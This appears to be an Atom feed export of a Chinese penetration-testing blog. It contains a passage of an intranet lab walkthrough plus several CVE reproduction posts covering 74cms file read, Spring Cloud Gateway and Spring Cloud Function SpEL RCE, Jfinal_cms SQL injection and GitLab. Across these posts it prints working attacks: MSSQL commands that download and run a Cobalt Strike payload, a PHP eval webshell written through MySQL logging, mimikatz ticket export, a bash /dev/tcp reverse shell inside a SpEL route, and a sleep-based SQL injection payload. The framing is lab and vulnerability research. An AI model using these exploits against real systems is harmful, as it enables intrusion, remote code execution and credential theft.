@runshell,&#39;run&#39;,null,&#39;ping xxxx.ceye.io&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/05/8iMXv7olFQ5WVEu.png" alt="image.png"></p><p>下载cs马</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @o int exec sp_oacreate &#39;scripting.filesystemobject&#39;, @o out exec sp_oamethod @o, &#39;copyfile&#39;,null,&#39;C:\Windows\System32\certutil.exe&#39; ,&#39;c:\windows\temp\do.exe&#39;;  #将certutil.exe复制到c:\windows\temp\下，并重命名为do.exe</span><br><span class="line">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;C:\Windows\Temp\do.exe -urlcache -split -f &quot;http:&#x2F;&#x2F;192.168.3.187:8080&#x2F;1.exe&quot; C:\Windows\Temp\1.exe&#39; #使用命令远程下载exe文件</span><br><span class="line">Declare @runshell INT Exec SP_OACreate &#39;wscript.shell&#39;,@runshell out Exec SP_OAMeTHOD @runshell,&#39;run&#39;,null,&#39;forfiles &#x2F;c 1.exe&#39;; #执行</span><br></pre></td></tr></table></figure><p>这里执行的时候我又失败了</p><p>既然如此那就用上线web1的方法，用ZheTian免杀框架</p><p>成功上线</p><p><img src="https://s2.loli.net/2022/04/05/V9GbyOZadEHhwMD.png" alt="image.png"></p><p><strong>systeminfo</strong>跟web1一样，再次用烂土豆提权</p><p><img src="https://s2.loli.net/2022/04/05/VOPr9jfF4EHMs7e.png" alt="image.png"></p><p><strong>lanzagne</strong>读一下<strong>data1</strong>密码</p><p><img src="https://s2.loli.net/2022/04/05/bCm7OSW269YcIyQ.png" alt="image.png"></p><p><strong>fc6ad1748c1d0eacee6adff0c6516dbb</strong>用NTML解密出来的密码是<strong>QWEasd.789x</strong></p><p>我们直接远程登录data1，同样给mstsc.exe挂上代理</p><p>没啥好玩的，fscan搜集下信息</p><p>发现web2地址</p><p><img src="https://s2.loli.net/2022/04/05/vpeYlmx2RjbFoIV.png" alt="image.png"></p><p>浏览器用之前的socks代理访问</p><p>提示JWT</p><p><img src="https://s2.loli.net/2022/04/05/FneqQSXaI2OfTdN.png" alt="image.png"></p><p>hashcat解密出来</p><p><img src="https://s2.loli.net/2022/04/05/3VTgfmRjMKcuHBd.png" alt="image.png"></p><p>伪造admin用户</p><p><img src="https://s2.loli.net/2022/04/05/feb2IS97lJswzNy.png" alt="image.png"></p><p>但是什么也没有，属实卡住了</p><p>最后看了官方解答才知道这里有个phpmyadmin（属实狭窄了，竟然没想过跑目录）</p><p>而且这里的密码竟然是JWT的密钥！绝了！</p><p><img src="https://s2.loli.net/2022/04/05/WvhC6Zg4nV2qJyS.png" alt="image.png"></p><p>那就phpmyadmin写shell</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES WHERE Variable_Name LIKE &quot;%dir&quot; #查路径</span><br><span class="line">set global general_log&#x3D;&#39;on&#39; #开日志</span><br><span class="line">set global general_log_file&#x3D;&#39;C:\\phpstudy_pro\\WWW\\shell.php&#39;; #设置日志路径</span><br><span class="line">show global variables like &quot;%genera%&quot; #查看写入情况</span><br><span class="line">select &#39;&lt;?php @eval($_POST[&quot;aaa&quot;]); ?&gt;&#39;; #写一句话</span><br></pre></td></tr></table></figure><p>写完蚂蚁连接</p><p>这里竟然直接是system，这是对JWT那里的补偿吗哈哈</p><p><img src="https://s2.loli.net/2022/04/05/PtLbSyaeJCl9YDf.png" alt="image.png"></p><p>发现不出网</p><p>那就用data1作为跳板机监听web2上线</p><p><img src="https://s2.loli.net/2022/04/05/dpxaHo1tMAGOTfK.png" alt="image.png"></p><p>定位到域控10.10.10.135</p><p><img src="https://s2.loli.net/2022/04/05/hcybumZNBQSvGMI.png" alt="image.png"></p><p>存在SPN服务</p><p><img src="https://s2.loli.net/2022/04/05/BvFOXUgq95mDSjJ.png" alt="image.png"></p><p>mimikatz导出票据</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::list          #查看</span><br><span class="line">mimikatz kerberos::list &#x2F;export  #导出</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/05/s5tEWFirnPZ3JuA.png" alt="image.png"></p><p>用<a href="https://github.com/nidem/kerberoast">tgsrepcrack.py</a>进行爆破</p><p>得到密码P@55w0rd!</p><p><img src="https://s2.loli.net/2022/04/05/yPetkz16x7Es8qR.png" alt="image.png"></p><p>psexec横向传递</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portscan 10.10.10.0&#x2F;24 445 扫描域内存活主机</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/05/MzCA4FS2sdTZmKG.png" alt="image.png"></p><p>在web2上创建一个SMB监听</p><p>对存活主机进行psexec横向</p><p><img src="https://s2.loli.net/2022/04/05/FDch38lBPRx4iwC.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/04/05/sQHznL8OdVpCMuW.png" alt="image.png"></p><p>域控上线</p><p><img src="https://s2.loli.net/2022/04/05/haozlSeEuWbsHGZ.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/04/05/zgkolGLbpUI5Tme.png" alt="image.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>渗透过程中遇到不少坑，还是经验不太够~</p><p>多参考百度~</p><p>百度是最好的老师~</p><p>bypass真的很重要！</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/lcxblogs/p/14214620.html">https://www.cnblogs.com/lcxblogs/p/14214620.html</a></p><p><a href="https://github.com/yqcs/ZheTian">https://github.com/yqcs/ZheTian</a></p><p><a href="https://www.cnblogs.com/sup3rman/p/13071382.html">https://www.cnblogs.com/sup3rman/p/13071382.html</a></p><p><a href="https://www.jianshu.com/p/9d5e8236647e">https://www.jianshu.com/p/9d5e8236647e</a></p><p>还好有多大佬们的思路</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;这个靶场来自暗月内网渗透&lt;/p&gt;
&lt;p&gt;主要考点&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="内网渗透" scheme="http://nice759.com/Categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="靶场" scheme="http://nice759.com/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>【CVE-2022-26271】74cmsSEv3.4.1 任意文件读取漏洞</title>
    <link href="http://nice759.com/2022/03/30/%E3%80%90CVE-2022-26271%E3%80%9174cmsSEv3-4-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://nice759.com/2022/03/30/%E3%80%90CVE-2022-26271%E3%80%9174cmsSEv3-4-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-03-30T07:13:17.000Z</published>
    <updated>2022-03-30T08:26:02.901Z</updated>
    
    <content type="html"><![CDATA[<h1 id="74cms"><a href="#74cms" class="headerlink" title="74cms"></a>74cms</h1><p>骑士人才系统是一项基于PHP+MYSQL为核心开发的一套免费 + 开源专业人才招聘系统。由太原迅易科技有限公司于2009年正式推出。为个人求职和企业招聘提供信息化解决方案, 骑士人才系统具备执行效率高、模板切换自由、后台管理功能灵活、模块功能强大等特点，自上线以来一直是职场人士、企业HR青睐的求职招聘平台。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>74cmsSEv3.4.1<br>项目下载地址：<a href="https://www.74cms.com/downloadse/show/id/62.html">https ://www.74cms.com/downloadse/show/id/62.html</a></p><h1 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h1><ul><li><p>分析<br>在\upload\application\index\controller\Download.php的第 10 行，有一个文件操作函数，其中$url是用户可以控制且不被过滤的参数，$ourput_filename是要发送的文件名被输出 由此，我们可以构建参数：/ index/download/index?name=index.php&amp;url=../../application/ database.php<br><img src="https://s2.loli.net/2022/03/30/5DJPSy3LKCzltVW.png" alt="图片.png"></p></li><li><p>利用 阅读网站数据库配置文件。PS：我用index.php是因为我没有配置Apache伪静态<br><img src="https://s2.loli.net/2022/03/30/9uI7PwTRZVONDlC.png" alt="图片.png"><br><img src="https://s2.loli.net/2022/03/30/fIhm9YUFEVGyDCo.png" alt="图片.png"><br>读取服务器文件<br><img src="https://s2.loli.net/2022/03/30/UAwbvBcdMpinL6s.png" alt="图片.png"><br><img src="https://s2.loli.net/2022/03/30/EmvSOPn3zAlCgjJ.png" alt="图片.png"></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;74cms&quot;&gt;&lt;a href=&quot;#74cms&quot; class=&quot;headerlink&quot; title=&quot;74cms&quot;&gt;&lt;/a&gt;74cms&lt;/h1&gt;&lt;p&gt;骑士人才系统是一项基于PHP+MYSQL为核心开发的一套免费 + 开源专业人才招聘系统。由太原迅易科技有限公司于20</summary>
      
    
    
    
    <category term="PHP" scheme="http://nice759.com/Categories/PHP/"/>
    
    
    <category term="代码审计" scheme="http://nice759.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="74cms" scheme="http://nice759.com/tags/74cms/"/>
    
    <category term="CVE-2022-26271" scheme="http://nice759.com/tags/CVE-2022-26271/"/>
    
  </entry>
  
  <entry>
    <title>【CVE-2022-22947】Spring Cloud Gateway rce</title>
    <link href="http://nice759.com/2022/03/30/%E3%80%90cve-2022-22947%E3%80%91Spring-Cloud-Gateway-rce/"/>
    <id>http://nice759.com/2022/03/30/%E3%80%90cve-2022-22947%E3%80%91Spring-Cloud-Gateway-rce/</id>
    <published>2022-03-30T07:12:56.000Z</published>
    <updated>2022-03-30T07:19:32.105Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><ul><li><p>3.1.0</p></li><li><p>3.0.0至3.0.6</p></li><li><p>3.0.0之前的版本</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1></li><li><p>本地搭建环境<br><img src="https://s2.loli.net/2022/03/30/yigc2DpWkFPRowI.png" alt="图片.png"></p></li><li><p>发送请求添加包含恶意SpEL 表达式的路由：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;gateway&#x2F;routes&#x2F;nice HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.10.175:32309</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 329</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;id&quot;: &quot;test&quot;,</span><br><span class="line">  &quot;filters&quot;: [&#123;</span><br><span class="line">    &quot;name&quot;: &quot;AddResponseHeader&quot;,</span><br><span class="line">    &quot;args&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;Result&#x3D;&quot;,</span><br><span class="line">      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;],</span><br><span class="line">   &quot;uri&quot;: &quot;http:&#x2F;&#x2F;test.com&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/30/4hXCQNkUnVqwMRg.png" alt="图片.png"></p></li><li><p>刷新路由，执行SpEL 表达式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;gateway&#x2F;refresh HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.10.175:32309</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/30/OW19dyH6aPIoVGM.png" alt="图片.png"></p></li><li><p>查看路由执行结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;actuator&#x2F;gateway&#x2F;routes&#x2F;nice HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.10.175:32309</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 4</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/30/F8DA1mrRIKc2EYG.png" alt="图片.png"></p></li><li><p>删除路由(同样需要refresh)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DELETE &#x2F;actuator&#x2F;gateway&#x2F;routes&#x2F;nice HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.10.175:32309</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 4</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/30/OK4lxGA8cPUigjs.png" alt="图片.png"></p></li><li><p>查看所有路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;actuator&#x2F;gateway&#x2F;routes HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.10.175:32309</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/30/dHulIwB2JVMq7zr.png" alt="图片.png"></p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;gateway&#x2F;routes&#x2F;nice11 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.10.175:53143</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 383</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;id&quot;: &quot;nice11&quot;,</span><br><span class="line">  &quot;filters&quot;: [&#123;</span><br><span class="line">    &quot;name&quot;: &quot;AddResponseHeader&quot;,</span><br><span class="line">    &quot;args&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;Result&#x3D;&quot;,</span><br><span class="line">      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#39;bash&#39;,&#39;-c&#39;,&#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;vps&#x2F;7778 0&gt;&amp;1&#39;&#125;).getInputStream()))&#125;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;],</span><br><span class="line">   &quot;uri&quot;: &quot;http:&#x2F;&#x2F;test.com&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/30/CBWcEGaF3VXUsYL.png" alt="图片.png"></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h1&gt;&lt;p&gt;Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处S</summary>
      
    
    
    
    <category term="Web渗透" scheme="http://nice759.com/Categories/Web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="漏洞复现" scheme="http://nice759.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="CVE-2022-22947" scheme="http://nice759.com/tags/CVE-2022-22947/"/>
    
    <category term="Spring Cloud Gateway" scheme="http://nice759.com/tags/Spring-Cloud-Gateway/"/>
    
  </entry>
  
  <entry>
    <title>Jfinal_cms sql 注入</title>
    <link href="http://nice759.com/2022/03/29/Jfinal-cms-sql-%E6%B3%A8%E5%85%A5/"/>
    <id>http://nice759.com/2022/03/29/Jfinal-cms-sql-%E6%B3%A8%E5%85%A5/</id>
    <published>2022-03-29T09:17:24.000Z</published>
    <updated>2022-03-29T09:19:26.546Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Jfinalcms"><a href="#Jfinalcms" class="headerlink" title="Jfinalcms"></a>Jfinalcms</h1><p>jfinal cms是一个java功能咨询网站采用了一个认证信息的JFinal作为web，框架引擎，beetl，数据库使用mysql，前端启动框架框架。</p><ul><li>项目地址<br><a href="https://github.com/jflyfox/jfinal_cms">https://github.com/jflyfox/jfinal_cms</a></li><li>版本<br>V5.1.0</li></ul><h1 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h1><ul><li>代码分析<br>漏洞出现在在<strong>com.jflyfox.system.log.LogController.java</strong>中的第23-47行<br><img src="https://s2.loli.net/2022/03/29/VZiytMkYzShO2rD.png" alt="图片.png"></li></ul><p>这里调用<strong>SQLUtils</strong>进行查询，查询的语句是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*)  from sys_log t where 1&#x3D;1</span><br></pre></td></tr></table></figure><p>当**model.getAttrValues()<strong>的长度不等于0时，进入if分支，调用</strong>whereEquals()**方法进行拼接<br>**whereEquals()**：</p><p><img src="https://s2.loli.net/2022/03/29/hGFTkxt691JMf2v.png" alt="图片.png"></p><p>那么可以拼接之后的sql语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*)  from sys_log t where 1&#x3D;1 AND t.log_type &#x3D; 1 </span><br></pre></td></tr></table></figure><p>继续往下看，<strong>orderBy</strong>参数被拼接到了刚刚的sql语句之后<br>再来看<strong>String orderBy = getBaseForm().getOrderBy();</strong><br>getBaseForm():<br><img src="https://s2.loli.net/2022/03/29/pOgsmcwWAEbL1y6.png" alt="图片.png"></p><p>getOrderBy()：<br><img src="https://s2.loli.net/2022/03/29/uao1qYAdibfH2FG.png" alt="图片.png"></p><p>通过分析可以得知，<strong>orderBy</strong>参数就是前端传过来的<strong>form.orderColumn</strong>参数<br>调用前端查询接口，可以看到前端提交了<strong>form.orderColumn</strong>等参数，且<strong>form.orderColumn</strong>是可控的<br><img src="https://s2.loli.net/2022/03/29/z67lroYfKOupbJ1.png" alt="图片.png"></p><p>那么就可以构造payload利用漏洞了</p><ul><li>漏洞利用<br>maven启动环境<br>漏洞地址：/jfinal_cms/system/log/list<br><img src="https://s2.loli.net/2022/03/29/G2kWiCEK4B1Xald.png" alt="图片.png"></li></ul><p>注入参数：<strong>form.orderColumn</strong><br>payload：**) AND (SELECT 6361 FROM (SELECT(SLEEP(5)))tAVU)– woqr**</p><p><img src="https://s2.loli.net/2022/03/29/gOaMAkthPWuVYrR.png" alt="图片.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Jfinalcms&quot;&gt;&lt;a href=&quot;#Jfinalcms&quot; class=&quot;headerlink&quot; title=&quot;Jfinalcms&quot;&gt;&lt;/a&gt;Jfinalcms&lt;/h1&gt;&lt;p&gt;jfinal cms是一个java功能咨询网站采用了一个认证信息的JFinal作为w</summary>
      
    
    
    
    <category term="代码审计" scheme="http://nice759.com/Categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="java" scheme="http://nice759.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Spring-Cloud-Function-SPEL-RCE</title>
    <link href="http://nice759.com/2022/03/29/Spring-Cloud-Function-SPEL-RCE/"/>
    <id>http://nice759.com/2022/03/29/Spring-Cloud-Function-SPEL-RCE/</id>
    <published>2022-03-29T09:17:01.000Z</published>
    <updated>2022-04-02T09:32:22.544Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Spring-Cloud-Function-SPEL-RCE"><a href="#Spring-Cloud-Function-SPEL-RCE" class="headerlink" title="Spring-Cloud-Function-SPEL-RCE"></a>Spring-Cloud-Function-SPEL-RCE</h1><h1 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h1><p>当Spring Cloud Function 启用动态路由functionRouter时， HTTP请求头 spring.cloud.function.routing-expression参数存在SPEL表达式注入漏洞，攻击者可通过该漏洞进行远程命令执行。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>3.0.0.RELEASE &lt;= Spring Cloud Function &lt;= 3.2.2</p><h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p><a href="https://github.com/N1ce759/Spring-Cloud-Function-SPEL-RCE">https://github.com/N1ce759/Spring-Cloud-Function-SPEL-RCE</a><br>JDK15！<br><img src="https://user-images.githubusercontent.com/100123029/160384105-7eab286d-ddc8-4a39-8f27-23904c39e6e2.png" alt="image"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>POC:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">POST &#x2F;functionRouter HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line">Content-Length: 3</span><br><span class="line"></span><br><span class="line">abc</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/100123029/160383973-fe42241e-58f3-4b66-b5f6-0a853c00db29.png" alt="image"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>参考<a href="https://mp.weixin.qq.com/s/cEOXkEgBO6IiuBhMXj_SMQ">https://mp.weixin.qq.com/s/cEOXkEgBO6IiuBhMXj_SMQ</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Spring-Cloud-Function-SPEL-RCE&quot;&gt;&lt;a href=&quot;#Spring-Cloud-Function-SPEL-RCE&quot; class=&quot;headerlink&quot; title=&quot;Spring-Cloud-Function-SPEL-RCE&quot;&gt;</summary>
      
    
    
    
    <category term="Web渗透" scheme="http://nice759.com/Categories/Web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="漏洞复现" scheme="http://nice759.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>【CVE-2021-22205】 GitLab 未授权RCE</title>
    <link href="http://nice759.com/2022/03/28/%E3%80%90CVE-2021-22205%E3%80%91GitLab-%E6%9C%AA%E6%8E%88%E6%9D%83RCE/"/>
    <id>http://nice759.com/2022/03/28/%E3%80%90CVE-2021-22205%E3%80%91GitLab-%E6%9C%AA%E6%8E%88%E6%9D%83RCE/</id>
    <published>2022-03-28T07:22:50.000Z</published>
    <updated>2022-03-28T07:25:23.188Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h1><p>GitLab 是由GitLab Inc.开发的一个用于仓库管理系统的开源项目，是一款Ruby开发的Git项目管理平台。由于在11.9以后的GitLab中，使用了图片处理工具ExifTool，而此图片处理工具又受到了漏洞CVE-2021-22204的影响：</p><p>漏洞触发ExifTool功能处，ExifTool是用于从图像中移除元数据的开源工具，在解析上传图像中的元数据时，并没有完全解析某些元数据，导致攻击者上传带有恶意元数据的图片，从而导致远程命令执行。</p><p>攻击者可以通过一个存在未授权的接口，上传一张恶意构造的图片，进而导致该漏洞在无需进行身份验证的情况下即可进行RCE</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Gitlab CE&#x2F;EE &lt; 13.10.3 </span><br><span class="line">Gitlab CE&#x2F;EE &lt; 13.9.6 </span><br><span class="line">Gitlab CE&#x2F;EE &lt; 13.8.8</span><br></pre></td></tr></table></figure><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" 